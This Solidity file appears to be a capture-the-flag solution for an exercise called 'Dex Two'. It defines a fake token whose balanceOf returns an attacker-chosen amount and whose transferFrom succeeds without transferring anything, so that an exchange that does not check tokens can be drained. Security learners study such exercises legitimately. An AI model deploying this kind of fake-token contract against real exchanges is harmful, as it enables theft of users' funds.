// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * this contract is a fake token, with the 2 functions called by the target
 * will return a balanceOf() superior to the amount traded, 
 * then will not transfer anything (fake transferFrom function).
 */
contract dexTwoAttack {

    // address payable public target;
    // Shop public immutable target;
    uint256 balance;
    constructor(uint256 _balance) {
      balance=_balance;
    }

  // fake balanceOf function, with same declaration as in IERC20 token contract
  function balanceOf(address account) external view returns (uint256) {
    return balance;
  }

  // fake transferFrom function, with same declaration as in IERC20 token contract
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
    return true;
  }
}
